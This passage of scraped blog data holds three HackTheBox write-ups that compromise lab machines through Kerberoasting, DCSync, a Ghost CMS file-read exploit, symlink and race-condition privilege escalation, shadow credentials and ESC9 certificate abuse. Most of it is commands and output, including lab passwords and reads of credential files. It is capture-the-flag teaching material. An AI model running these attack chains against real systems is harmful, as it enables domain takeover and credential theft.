21/tcp open ftp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 52649/tcp open unknown 59626/tcp open unknown 59631/tcp open unknown 59638/tcp open unknown 59643/tcp open unknown 59655/tcp open unknown We use bloodhound-python with the provided credentials Olivia:ichliebedich to gather information about the administrator.htb domain (added to our /etc/hosts file).\nWe quickly identify that compromising Ethan\u0026rsquo;s account will be necessary to perform a DCSync attack and retrieve the domain adminâ€™s hash. User GenericWrite, Olivia -\u0026gt; Michael To compromise Ethan\u0026rsquo;s account, we first need to compromise Emily\u0026rsquo;s account, which has GenericWrite privileges over Ethan. As shown above, there is no direct path to Emily\u0026rsquo;s account. Weâ€™ll focus on the access rights of our initial user, Olivia.\nShe has GenericAll privileges over Michael, so weâ€™ll perform a targeted Kerberoast attack to retrieve his hash.\nSince the hash couldnâ€™t be cracked, we used Oliviaâ€™s privileges to force a password change for Michael\u0026rsquo;s account. 1 2 3 4 5 6 7 8 9 $ ./targetedKerberoast.py -v -d \u0026#39;administrator.htb\u0026#39; -u \u0026#39;olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (michael) [+] Printing hash for (michael) $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$64da\u0026lt;...\u0026gt;d [VERBOSE] SPN removed successfully for (michael) $ net rpc password \u0026#34;michael\u0026#34; \u0026#34;michael_pass\u0026#34; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;olivia\u0026#34;%\u0026#34;ichliebedich\u0026#34; -S \u0026#34;administrator.htb\u0026#34; ForceChangePassword, Michael -\u0026gt; Benjamin Continuing our enumeration in BloodHound, we notice that Michael has the ability to change the password of Benjamin. We use the same command as previously to perform the password change. 1 $ net rpc password \u0026#34;benjamin\u0026#34; \u0026#34;benjamin_pass\u0026#34; -U \u0026#34;administrator.htb\u0026#34;/\u0026#34;michael\u0026#34;%\u0026#34;michael_pass\u0026#34; -S \u0026#34;administrator.htb\u0026#34; Benjamin is a member of the SHARE MODERATORS group. We donâ€™t find anything interesting on the SMB shares, but on the FTP server we discover a file named Backup.psafe3. We download it and crack its password using Hashcat.\nFTP et Backup.psafe3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 $ ftp benjamin@10.10.11.42 \u0026lt;...\u0026gt; ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||50350|) 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp\u0026gt; mget backup.psafe3 mget Backup.psafe3 [anpqy?]? yes 229 Entering Extended Passive Mode (|||50354|) 125 Data connection already open; Transfer starting. 100% |*******************************************************************************************| 952 56.85 KiB/s 00:00 ETA 226 Transfer complete. \u0026lt;...\u0026gt; ftp\u0026gt; exit 221 Goodbye. $ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; Backup.psafe3:\u0026lt;...\u0026gt; Session..........: hashcat Status...........: Cracked Hash.Mode........: 5200 (Password Safe v3) Hash.Target......: Backup.psafe3 Time.Started.....: Sat Apr 19 20:18:43 2025 (1 sec) Time.Estimated...: Sat Apr 19 20:18:44 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 23899 H/s (6.93ms) @ Accel:256 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 5120/14344385 (0.04%) Rejected.........: 0/5120 (0.00%) Restore.Point....: 4608/14344385 (0.03%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049 Candidate.Engine.: Device Generator Candidates.#1....: Liverpool -\u0026gt; babygrl Hardware.Mon.#1..: Util: 60% Started: Sat Apr 19 20:18:42 2025 Stopped: Sat Apr 19 20:18:45 2025 We use this password to open the file with pwsafe and retrieve Emily\u0026rsquo;s password. 1 $ pwsafe Backup.psafe3 We notice in BloodHound that Emily has access to the machine, so we gain access to it using evil-winrm and retrieve the user.txt file.\n1 2 3 4 5 6 7 8 $ evil-winrm -i 10.10.11.42 -u emily -p U\u0026lt;...\u0026gt;b \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\emily\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\emily\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/30/2024 2:23 PM 2308 Microsoft Edge.lnk -ar--- 4/19/2025 3:02 PM 34 user.txt Root GenericWrite, Emily -\u0026gt; Ethan As previously mentionned, Emily has GenericWrite privileges over Ethan, and, Ethan has DCSync rights.\nFirst, we retrieve Ethanâ€™s hash and crack it using Hashcat. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $ ./targetedKerberoast.py -v -d \u0026#39;administrator.htb\u0026#39; -u \u0026#39;emily\u0026#39; -p \u0026#39;U\u0026lt;...\u0026gt;b\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (ethan) [+] Printing hash for (ethan) $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3\u0026lt;...\u0026gt;7 [VERBOSE] SPN removed successfully for (ethan) $ hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$3\u0026lt;...\u0026gt;7:l\u0026lt;...\u0026gt;t Session..........: hashcat Status...........: Cracked Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP) Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....9cb327 Time.Started.....: Sat Apr 19 20:39:25 2025 (0 secs) Time.Estimated...: Sat Apr 19 20:39:25 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 641.4 kH/s (0.52ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 5120/14344385 (0.04%) Rejected.........: 0/5120 (0.00%) Restore.Point....: 4608/14344385 (0.03%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: Liverpool -\u0026gt; babygrl Hardware.Mon.#1..: Util: 71% Started: Sat Apr 19 20:39:24 2025 Stopped: Sat Apr 19 20:39:27 2025 DCSync Then, we perform a DCSync attack using the recovered password with secretsdump. 1 2 3 4 5 $ ./secretsdump.py \u0026#39;administrator.htb\u0026#39;/\u0026#39;ethan\u0026#39;:\u0026#39;l\u0026lt;...\u0026gt;t\u0026#39;@\u0026#39;administrator.htb\u0026#39; \u0026lt;...\u0026gt; Administrator:500:a\u0026lt;...\u0026gt;e\u0026gt;:3\u0026lt;...\u0026gt;e::: \u0026lt;...\u0026gt; [*] Cleaning up... Now, we can use evil-winrm to gain access to the Domain Controller using the administrator\u0026rsquo;s NTHASH. 1 2 3 4 5 6 7 $ evil-winrm -i 10.10.11.42 -u administrator -H 3\u0026lt;...\u0026gt;e \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/19/2025 6:52 PM 34 root.txt ","date":"2025-04-19T00:00:00Z","image":"https://01MI.github.io/p/administrator-htb-writeup-windows-medium/Administrator_hu_ed4e04bc14c04332.PNG","permalink":"https://01MI.github.io/p/administrator-htb-writeup-windows-medium/","title":"Administrator - Windows Medium - HTB Writeup"},{"content":"Summary User: Exposed .git repository \u0026amp; CVE-2023-40028\nRoot: Nested symlinks or TOCTOU race condition exploit\nEnumeration Starting with a simple nmap scan, we can identify that ssh and a web server are running. 1 2 3 4 5 $ nmap -Pn -p- 10.10.11.47 -v PORT STATE SERVICE 22/tcp open ssh 80/tcp open http User Fuzzing We discover \u0026ldquo;\u0026ldquo;BitByBit Hardware\u0026rdquo; website running on port 80 powered by Ghost CMS. After adding it to our hosts file, we fuzz it and uncover a subdomain: dev.linkvortex.htb 1 2 3 $ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://linkvortex.htb -H \u0026#34;host: FUZZ.linkvortex.htb\u0026#34; -fs 230 \u0026lt;...\u0026gt; dev [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 15ms] Fuzzing this subdomain reveals the presence of a .git directory.\n1 2 3 4 5 6 7 8 9 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ \u0026lt;...\u0026gt; .git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 15ms] .git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 18ms] .git/logs/ [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 19ms] .git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 17ms] .git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 17ms] index.html [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 16ms] server-status [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 19ms] We can then use the tool GitHack to recover the original source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ./GitHack.py http://dev.linkvortex.htb/.git/ \u0026lt;...\u0026gt; $ tree dev.linkvortex.htb dev.linkvortex.htb â”œâ”€â”€ Dockerfile.ghost â””â”€â”€ ghost â””â”€â”€ core â””â”€â”€ test â””â”€â”€ regression â””â”€â”€ api â””â”€â”€ admin â””â”€â”€ authentication.test.js 7 directories, 2 files Among the recovered files, we find authentication.test.js, which contains the admin credentials:\n1 2 3 4 5 6 7 8 9 10 11 $ less ghost/core/test/regression/api/admin/authentication.test.js \u0026lt;...\u0026gt; it(\u0026#39;complete setup\u0026#39;, async function () { const email = \u0026#39;test@example.com\u0026#39;; const password = \u0026#39;OctopiFociPilfer45\u0026#39;; const requestMock = nock(\u0026#39;https://api.github.com\u0026#39;) .get(\u0026#39;/repos/tryghost/dawn/zipball\u0026#39;) .query(true) .replyWithFile(200, fixtureManager.getPathForFixture(\u0026#39;themes/valid.zip\u0026#39;)); \u0026lt;...\u0026gt; We can then use this password to access the administration interface(username can be easily guessed as admin@linkvortex.htb) using http://linkvortex.htb/ghost/#/signin but it doesn\u0026rsquo;t give us further access.\nHowever, in Dockerfile.ghost, we find the Ghost version: 5.58.0, which is vulnerable to CVE-2023-40028, an arbitrary file read vulnerability. 1 2 3 $ cat Dockerfile.ghost FROM ghost:5.58.0 \u0026lt;...\u0026gt; Using this exploit, we can try it to read the /etc/passwd file.\n1 2 3 4 5 6 7 $ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb WELCOME TO THE CVE-2023-40028 SHELL Enter the file path to read (or type \u0026#39;exit\u0026#39; to quit): /etc/passwd File content: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u0026lt;...\u0026gt; What other interresting files can we read ? Well, looking back at Dockerfile.ghost, we find a config file path: /var/lib/ghost/config.production.json.\n1 2 3 4 5 6 $ cat Dockerfile.ghost FROM ghost:5.58.0 # Copy the config COPY config.production.json /var/lib/ghost/config.production.json \u0026lt;...\u0026gt; Reading this file via the CVE reveals the credentials of the user: bob.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb WELCOME TO THE CVE-2023-40028 SHELL Enter the file path to read (or type \u0026#39;exit\u0026#39; to quit): /var/lib/ghost/config.production.json File content: \u0026lt;...\u0026gt; \u0026#34;mail\u0026#34;: { \u0026#34;transport\u0026#34;: \u0026#34;SMTP\u0026#34;, \u0026#34;options\u0026#34;: { \u0026#34;service\u0026#34;: \u0026#34;Google\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;linkvortex.htb\u0026#34;, \u0026#34;port\u0026#34;: 587, \u0026#34;auth\u0026#34;: { \u0026#34;user\u0026#34;: \u0026#34;bob@linkvortex.htb\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;fibber-talented-worth\u0026#34; } } } With these credentials, we canconnect via SSH the machine and retrieve the user flag. 1 2 3 4 $ ssh bob@linkvortex.htb bob@linkvortex:~$ pwd; ls /home/bob user.txt Root Symlinks Running sudo -l, we find that bob can execute the script clean_symlink.sh as root without a password:\n1 2 3 4 5 6 7 8 bob@linkvortex:~$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png If we take a look at second part of the script, we see that it checks for the presence of etc or root in the symlink target path. If such terms are detected, the link is deleted.\nOtherwise, it is moved to /var/quarantined, and if the environment variable CHECK_CONTENT is set to true, the file content is displayed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash QUAR_DIR=\u0026#34;/var/quarantined\u0026#34; if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi LINK=$1 if ! [[ \u0026#34;$LINK\u0026#34; =~ \\.png$ ]]; then /usr/bin/echo \u0026#34;! First argument must be a png file !\u0026#34; exit 2 fi if /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then /usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34; /usr/bin/unlink $LINK else /usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34; /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null fi fi fi We can use two approaches to bypass these checks and read the root.txt file: nested symlinks or TOCTOU exploit.\nMethod 1: Nested symlinks We create two symlinks, link1.png to link2.png and link2.png points to /root/root.txt.\nThis way, link1 bypasses the keyword check since its target doesn\u0026rsquo;t contain (etc|root).\n/home/bob/link1.png -\u0026gt; /home/bob/link2.png -\u0026gt; root.txt\n1 2 3 4 5 6 7 bob@linkvortex:~$ export CHECK_CONTENT=true bob@linkvortex:~$ ln -s /root/root.txt link2.png bob@linkvortex:~$ ln -s $PWD/link2.png link1.png bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link1.png Link found [ link1.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 Method 2: TOCTOU race condition The script checks if the file is a symlink using /usr/bin/test -L link.png. Then, it calls basename and readlink based on that assumption.\nBetween the check and the read of the symlink, we can exploit a race condition by continuously interchange the symlink target /tmp/random to /root/root.txt.\nIn one terminal, we run a loop that flips the symlink target.\nIn another terminal, we repeatedly execute the vulnerable script.\nIf the timing is right, the script displays the content of root.txt.\nThis vulnerability is called TOCTOU (Time-of-Check to Time-of-use).\nUsing this article, we can try to access root.txt.\nTerminal 1 1 2 3 4 bob@linkvortex:~$ timeout 5s bash -c \u0026#39;while true; do ln -sf $PWD/random $PWD/link.png; ln -sf /root/root.txt $PWD/link.png; done\u0026#39; ln: failed to create symbolic link \u0026#39;/home/bob/link.png\u0026#39;: File exists ln: failed to create symbolic link \u0026#39;/home/bob/link.png\u0026#39;: File exists \u0026lt;...\u0026gt; Terminal 2 1 2 3 4 5 6 7 8 9 bob@linkvortex:~$ timeout 2s bash -c \u0026#39;while true; do sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link.png; done\u0026#39; Link found [ link.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 ! Trying to read critical files, removing link [ link.png ] ! Link found [ link.png ] , moving it to quarantine Content: 6\u0026lt;...\u0026gt;3 \u0026lt;...\u0026gt; Resources CVE-2023-40028 exploit\nGitHack\nCTF Writeup: picoCTF 2023 - \u0026ldquo;Tic-Tac\u0026rdquo;\n","date":"2025-04-13T00:00:00Z","image":"https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/LinkVortex_hu_3426985da32ddd52.PNG","permalink":"https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/","title":"LinkVortex - Linux Easy - HTB Writeup"},{"content":"This is my first writeup for an HTB box.\nSummary User: ACL abuses\nRoot: ADCS template abuses\nEnumeration Starting with a simple nmap scan, we can identify that this machine is an Active Directory domain controller.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ nmap 10.10.11.41 -Pn -v PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl With the provided account judith.mader we can use bloodhound-python to retrieve informations about the certified.htb domain. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ bloodhound-python -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -ns 10.10.11.41 -d certified.htb -c all INFO: Found AD domain: certified.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.certified.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.certified.htb INFO: Found 10 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.certified.htb INFO: Done in 00M 03S In BloodHound, we can quickly notice which path to take in order to gain access to DC01. User Judith -\u0026gt; Management Group We can see Judith has WriteOwner over the management group. This allows us to add Judith as the owner and then as a member of this group. First, we change the ownership of the group. 1 2 3 4 5 6 7 8 9 $ ./owneredit.py -action write -new-owner \u0026#39;judith.mader\u0026#39; -target \u0026#39;MANAGEMENT\u0026#39; \u0026#39;CERTIFIED.HTB\u0026#39;/\u0026#39;judith.mader\u0026#39;:\u0026#39;judith09\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Current owner information below [*] - SID: S-1-5-21-729746778-2675978091-3820388244-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb [*] OwnerSid modified successfully! Then, we add Judith as a member of the group. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ./dacledit.py -k \u0026#39;certified.htb/judith.mader:judith09\u0026#39; -dc-ip certified.htb -principal judith.mader -target \u0026#34;management\u0026#34; -action write -rights FullControl [-] CCache file is not found. Skipping... [*] DACL backed up to dacledit-20250314-002015.bak [*] DACL modified successfully! $ net rpc group members \u0026#34;management\u0026#34; -U \u0026#39;judith.mader\u0026#39; -S certified.htb Password for [WORKGROUP\\judith.mader]: CERTIFIED\\management_svc $ net rpc group addmem \u0026#34;management\u0026#34; judith.mader -U \u0026#39;judith.mader\u0026#39; -S certified.htb $ net rpc group members \u0026#34;management\u0026#34; -U \u0026#39;judith.mader\u0026#39; -S certified.htb Password for [WORKGROUP\\judith.mader]: CERTIFIED\\judith.mader CERTIFIED\\management_svc Management group -\u0026gt; management_svc Going back on BloodHound, we noticed that management_svc is kerberoastable but the hash retrieved can\u0026rsquo;t be cracked.\nWe can see that the members of the management group have GenericWrite over the management_svc user. By leveraging this permission, we can use the shadow credentials technique in order to gain access to management_svc and retrieve the NT hash. First, we generate a .pfx file and populate the msDS-KeyCredentialLink attribute of management_svc using Pywhisker. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ./pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: d1df9aac-4ae1-36e0-f803-d8e369ed930e [*] Updating the msDS-KeyCredentialLink attribute of management_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: 9JZGbAPu.pfx [+] PFX exportiert nach: 9JZGbAPu.pfx [i] Passwort fÃ¼r PFX: c2U4qtZsMkLNEedx4nFb [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: 9JZGbAPu.pfx [*] Must be used with password: c2U4qtZsMkLNEedx4nFb [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Then, we retrieve a TGT for management_svc and the NT hash using PKINITtools. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ./gettgtpkinit.py certified.htb/management_svc -cert-pfx 9JZGbAPu.pfx -pfx-pass c2U4qtZsMkLNEedx4nFb management_svc.ccache 2025-03-14 01:42:02,044 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-03-14 01:42:02,082 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-03-14 01:42:02,138 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-03-14 01:42:02,138 minikerberos INFO 37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 INFO:minikerberos:37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 2025-03-14 01:42:02,141 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file $ KRB5CCNAME=management_svc.ccache ./getnthash.py CERTIFIED.HTB/management_svc -key 37b5b0b8873bb21cdf40daad3dcf408af0be706f772bf52dda96dbecfa00f041 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash a\u0026lt;...\u0026gt;4 $ crackmapexec smb 10.10.11.41 -u \u0026#34;management_svc\u0026#34; -H a\u0026lt;...\u0026gt;4 SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 [+] certified.htb\\management_svc:a\u0026lt;...\u0026gt;4 We can then use evil-winrm to gain a shell on the machine using management_svc. Even if the port was not shown as open in the initial nmap scan, it\u0026rsquo;s open.\nFinally, we can retrieve the hash for the user part. 1 2 3 4 5 6 $ evil-winrm -i 10.10.11.41 -u management_svc -H a\u0026lt;...\u0026gt;4 \u0026lt;...\u0026gt; *Evil-WinRM* PS C:\\Users\\management_svc\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/13/2025 2:54 PM 34 user.txt Root management_svc -\u0026gt; ca_operator Now that management_svc is compromise, we can see in BloodHound that ca_operator can also be compromise using the same technique, abusing GenericAll permission that management_svc has over ca_operator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ ./pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;management_svc\u0026#34; -H \u0026#34;a\u0026lt;...\u0026gt;4\u0026#34; --target \u0026#34;ca_operator\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 174934b2-1249-c39a-bc89-5b4b5c01b784 [*] Updating the msDS-KeyCredentialLink attribute of ca_operator [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: zlax30FB.pfx [+] PFX exportiert nach: zlax30FB.pfx [i] Passwort fÃ¼r PFX: CiktaI0YO7y9IV9T9mnM [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: zlax30FB.pfx [*] Must be used with password: CiktaI0YO7y9IV9T9mnM [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools $ ./gettgtpkinit.py certified.htb/ca_operator -cert-pfx EkDY6hor.pfx -pfx-pass WlZFTKpVBy3BzPXcgzCX ca_operator.ccache 2025-03-14 03:11:26,295 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-03-14 03:11:26,333 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-03-14 03:11:50,020 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-03-14 03:11:50,020 minikerberos INFO 91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 INFO:minikerberos:91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 2025-03-14 03:11:50,023 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file $ ./getnthash.py CERTIFIED.HTB/ca_operator -key 91a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash b\u0026lt;...\u0026gt;2 ESC9, ADCS template abuse Per the name of the box and that ADCS is running on the machine, we can clearly assume the root part will concern ADCS certificates. 1 2 3 4 5 6 $ nxc ldap 10.10.11.41 -u management_svc -H a\u0026lt;...\u0026gt;4 -M adcs SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.41 389 DC01 [+] certified.htb\\management_svc:a\u0026lt;...\u0026gt;4 ADCS 10.10.11.41 389 DC01 [*] Starting LDAP search with search filter \u0026#39;(objectClass=pKIEnrollmentService)\u0026#39; ADCS 10.10.11.41 389 DC01 Found PKI Enrollment Server: DC01.certified.htb ADCS 10.10.11.41 389 DC01 Found CN: certified-DC01-CA Using certipy-ad, we can find a vulnerable certificate template. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ certipy-ad find -u \u0026#39;ca_operator@certified.htb\u0026#39; -hashes b\u0026lt;...\u0026gt;2 -dc-ip \u0026#39;10.10.11.41\u0026#39; -vulnerable Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;certified-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20250313205721_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20250313205721_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20250313205721_Certipy.json\u0026#39; $ cat 20250313205721_Certipy.txt \u0026lt;...\u0026gt; Template Name : CertifiedAuthentication Display Name : Certified Authentication \u0026lt;...\u0026gt; [!] Vulnerabilities ESC9 : \u0026#39;CERTIFIED.HTB\\\\operator ca\u0026#39; can enroll and template has no security extension \u0026lt;...\u0026gt; Using the attack path from thehacker.recipes for ESC9 we can compromise the domain administrator account.\nWe already have the NT hash of ca_operator, so we can change their userPrincipalName attribute to Administrator. 1 2 3 4 5 6 $ certipy-ad account update -username \u0026#34;management_svc@certified.htb\u0026#34; -hashes a\u0026lt;...\u0026gt;4 -user ca_operator -upn Administrator Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : Administrator [*] Successfully updated \u0026#39;ca_operator\u0026#39; Then, we can request an authentication certificate as ca_operator using the vulnerable template.\nCa and template values can be found in the .txt generated earlier. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ cat 20250313205721_Certipy.txt \u0026lt;...\u0026gt; Certificate Templates 0 Template Name : CertifiedAuthentication Display Name : Certified Authentication Certificate Authorities : certified-DC01-CA 